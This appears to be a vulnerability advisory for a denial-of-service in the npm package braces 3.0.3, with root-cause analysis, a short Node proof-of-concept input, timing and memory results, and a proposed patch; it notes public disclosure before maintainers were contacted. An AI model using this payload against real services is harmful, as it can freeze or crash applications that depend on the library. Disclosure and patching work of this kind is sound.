# CVE-Candidate: Denial of Service in braces via Comma-Separated Brace Expansion

**Package:** [braces](https://github.com/micromatch/braces) (npm)
**Version:** 3.0.3 (latest)
**Severity:** HIGH (CVSS 7.5)
**CWE:** CWE-400 Uncontrolled Resource Consumption
**Status:** Unreported

> **Note:** This is an independent finding. CVE-2024-4068 addressed input length limiting (MAX_LENGTH=10000) but did not fix the combinatorial output explosion from comma-separated brace patterns. CVE-2026-45149 affects a *different* package (`juliangruber/brace-expansion`), not `micromatch/braces`.

---

## The Story

`braces` powers webpack, vitest, jest, eslint and chokidar - some of the most-installed tooling on the planet. It got patched for a DoS (CVE-2024-4068) by capping input *length*. But the patch only guards numeric ranges like `{1..1000}`.

I bypassed it with 110 characters: `'{a,b}'.repeat(22)` → 4.2 million items → 1.2GB+ RAM → a 10-second frozen event loop.

The bug the patch fixed was the symptom. The root cause - combinatorial output explosion with no cap - was still sitting there. This is what a CVE-candidate looks like: an incomplete fix that leaves a HIGH severity DoS live in the world's most popular build toolchain.

## Vulnerability

The `braces` library is vulnerable to denial of service through uncontrolled resource consumption when processing comma-separated brace expansion patterns.

A malicious input as short as **110 characters** causes the library to materialize **4.2 million items** in memory, consuming **1.2GB+ of RAM** and blocking the CPU for **9-30 seconds** (varies by hardware).

This is an incomplete fix for [CVE-2024-4068](https://github.com/advisories/GHSA-4g82-wqcq-rhqv). The original patch limited input length to 10,000 characters but did not limit the combinatorial output of comma-separated expansions.

## Impact

`braces` is a dependency of `micromatch`, which is used by:

- **webpack** (bundler)
- **vitest** (test runner)
- **jest** (test runner)
- **eslint** (linter)
- **chokidar** (file watcher)
- Hundreds of other tools

Any application that passes user-controlled input to `braces.expand()` is vulnerable.

## Root Cause

In `lib/expand.js`, the `rangeLimit` guard only checks numeric ranges (`{1..1000}`), not comma-separated patterns (`{a,b}`):

```javascript
// lib/expand.js:57
if (node.ranges > 0) {  // only numeric ranges are checked
  if (utils.exceedsLimit(...args, options.step, rangeLimit)) {
    throw new RangeError('...');
  }
}
// Comma-separated expansions skip this check entirely
```

The `append()` function recursively builds all 2^N combinations into an array with no output limit.

## Proof of Concept

### Quick Test

```bash
mkdir braces-test && cd braces-test
npm init -y && npm install braces@3.0.3
node -e "
const braces = require('braces');
const input = '{a,b}'.repeat(22);
console.time('expand');
const result = braces.expand(input);
console.timeEnd('expand');
console.log('Items:', result.length.toLocaleString());
"
```

### Full PoC Script

```bash
# Install dependency first
npm install braces@3.0.3
python3 poc_braces_dos.py
```

### Test Results

Item counts are deterministic. Timing and memory vary by hardware.

| Input (chars) | Output Items | Time (approx) | Memory (approx) |
|---------------|-------------|---------------|-----------------|
| 50 | 1,024 | ~10ms | ~1MB |
| 75 | 32,768 | ~100ms | ~16MB |
| 90 | 262,144 | ~700ms | ~116MB |
| 100 | 1,048,576 | ~2-4s | ~243-468MB |
| 110 | 4,194,304 | ~10-30s | ~1.2GB+ |
| 125+ | Crash/OOM | Timeout | OOM Kill |

### Evidence of Vulnerability (PoC Output)

```text
======================================================================
PoC: braces 3.0.3 Denial of Service
CVE-CANDIDATE: CVE-2024-4068 incomplete fix
======================================================================

[*] Finding DoS threshold...

  n=10: input=   50 chars ->      1,024 items,      4,096 chars,     11ms, +912KB
  n=15: input=   75 chars ->     32,768 items,    163,840 chars,     96ms, +15915KB
  n=18: input=   90 chars ->    262,144 items,  1,310,720 chars,    737ms, +115535KB
  n=20: input=  100 chars ->  1,048,576 items,  5,242,880 chars,   1833ms, +242558KB
  n=22: input=  110 chars ->  4,194,304 items, 20,971,520 chars,   9723ms, +1196410KB
  n=25: TIMEOUT/OOM

[*] Conclusion:
  - Input size: 110 characters (well within the 10,000 character limit)
  - Memory consumption: >1.2GB
  - CPU block time: ~10 seconds
```

## Affected Code Path

```
braces.expand(input)
  -> lib/expand.js:walk()
    -> lib/expand.js:append()  <- no output limit
      -> recursively builds all 2^N combinations
        -> returns massive array
```

## Recommended Fix

Add a limit check at each concatenation step in `lib/expand.js` to prevent combinatorial explosion. Wrap calls to `append` inside `walk()` with a validation helper:

```javascript
const queueLimit = (queue, stash, enclose) => {
  if (rangeLimit === Infinity) return append(queue, stash, enclose);
  const queueLength = queue ? [].concat(queue).length : 0;
  const stashLength = [].concat(stash).length;
  const nextLength = queueLength === 0 ? stashLength : (stashLength === 0 ? queueLength : queueLength * stashLength);
  if (nextLength > rangeLimit) {
    throw new RangeError('expanded array length exceeds range limit. Use options.rangeLimit to increase or disable the limit.');
  }
  return append(queue, stash, enclose);
};
```

Replacing calls to `append()` inside `walk()` with `queueLimit()` ensures that combinations of consecutive braces and ranges are safely bounded.

## Disclosure Timeline

| Date | Event |
|------|-------|
| 2026-07-17 | Vulnerability discovered |
| 2026-07-21 | Public disclosure (responsible disclosure not yet initiated) |

## Files

| File | Description |
|------|-------------|
| `poc_braces_dos.py` | Working PoC script |
| `findings.md` | Detailed vulnerability analysis |
| `verdict.md` | Confirmation and CVSS score |
| `disclosure-report.md` | Ready-to-submit advisory |
| `patch.diff` | Proposed fix for lib/expand.js |
| `email-draft.txt` | Draft email to maintainers |

## Credit

Discovered by [cyeezy08](https://github.com/cyeezy08).
